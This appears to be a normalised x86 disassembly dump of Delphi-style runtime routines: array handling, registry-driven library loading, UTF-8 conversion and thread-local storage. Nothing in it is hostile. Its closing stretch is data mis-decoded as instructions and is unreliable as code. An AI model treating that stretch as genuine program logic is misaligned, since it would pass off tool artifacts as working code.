mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404c74
jmp r-xdata
mov al 0x4
call sub_402818
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402818
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_4026fc
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026bc
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402b18
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_4048dc
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028b8
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402b18
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_404c5c
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_404c7c
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_404e14
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4026dc
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_4048dc
sub_404e50
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_404e14
pop edx
pop eax
sub_404e78
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012cc
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_404ea8
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40125c
mov eax esp
mov dl 0x1
call sub_4050e4
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_404ef0
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_404ea8
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_404f2c
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401264
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40126c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_404f18
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_404f18
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_404f18
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call sub_40123c
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call sub_401234
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_4050e4
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40125c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012b4
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4051e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_404f2c
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012bc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012b4
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012ac
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012bc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012b4
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_40127c
push eax
call sub_401254
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_40535c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ rw-data ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_404ea8
mov edx edi
call esi
test al al
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
sub_4053b8
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_4026dc
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_4026dc
jmp r-xdata
sub_405418
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_405453
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_405484
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_403858#5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_405418
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4054ef
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_40550c
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_405538
test edx edx
je sub_4054f4
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402818
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_4055dc
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_405604
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_4056e0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405818
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4058b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403e54
mov eax ebx
xor edx edx
call sub_4046ac
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4058be
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
mov eax ebx
call sub_4046a0
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_4044a0
mov eax ebx
call sub_4046a0
push eax
mov eax [ ebp - 0x4 ]
call sub_404114
inc eax
push eax
mov eax ebx
call sub_404690
push eax
mov eax [ ebp - 0x4 ]
call sub_404314
pop ecx
pop edx
call sub_405604
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403e54
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4044a0
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403ea8
sub_4058c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40595b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404534
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405962
lea eax [ ebp - 0x4 ]
call sub_404534
retn
mov eax ebx
call sub_404114
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_40477c
mov eax ebx
call sub_404114
push eax
mov eax [ ebp - 0x4 ]
call sub_4046a0
inc eax
push eax
mov eax ebx
call sub_404314
push eax
mov eax [ ebp - 0x4 ]
call sub_404690
pop ecx
pop edx
call sub_4056e0
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404534
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_40477c
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404570
sub_405968
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4059ab
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404680
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405818
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4059b2
lea eax [ ebp - 0x4 ]
call sub_404534
retn
sub_4059b8
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_40404c
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_404ef0
push eax
call sub_40128c
mov ecx eax
mov edx esp
mov eax esi
call sub_403f44
jmp r-xdata
sub_405a10
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405a76
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401254
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_4040c4
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402b38
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405a7d
lea eax [ ebp - 0x10 ]
call sub_403e54
retn
xor ebx ebx
sub_405a84
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405ace
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405ad5
retn
mov eax rw-data
call sub_4029b0
mov eax rw-data
call sub_4029b0
mov eax rw-data
call sub_4029b0
call sub_401ac0
sub_405ad8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404c20
call sub_402f44
test al al
je r-xdata
call sub_403038
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_40130c
mov [ rw-data ] eax
call sub_401304
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_402f74
call sub_40127c
call sub_405a10
mov [ rw-data ] eax
call sub_401304
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_40127c
call sub_405a10
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_4012fc
mov [ rw-data ] eax
sub_405be0
push ebx
call sub_405bd8
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405bcc
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403e48
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403e48
sub_405c24
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405be0
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_405c70
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405bac
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_405c64
mov edx rw-data
mov eax ebx
call sub_403b9c
pop ebx
retn
sub_405cb4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405cd9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405ce0
retn
sub_405d10
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_405d2c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405d51
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d58
retn
sub_405d64
push 0x300405d
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
pop ebp
inc eax
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
xchg ebx eax
inc esi
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
inc esi
add [ ebx + 0x1c25ffc0 ] cl
jb r-xdata
jb r-xdata
je r-xdata
inc esi
add [ ebx + 0x1025ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0xc25ffc0 ] cl
xchg ebx eax
sar bh 0x25
adc al 0x93
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc esi
add [ ebx + 0x825ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x425ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x25ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x3da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x7da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0xbda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0xfda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x13da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x17da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x1bda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x1fda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x23da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x27da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x2bda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x2fda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x33da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x37da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x3bda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x3fda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x43da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x47da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x4bda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x4fda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x53da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x57da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x5bda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x5fda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x63da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x67da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x6bda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x6fda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x73da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x77da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x7bda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x7fda0040 ] cl
xchg edx eax
inc esi
add [ ebx + 0x7c25ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x7825ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x7425ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x7025ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x6c25ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x6825ffc0 ] cl
xchg edx eax
inc esi
add [ ebx + 0x6425ffc0 ] cl
xchg edx eax
inc esi
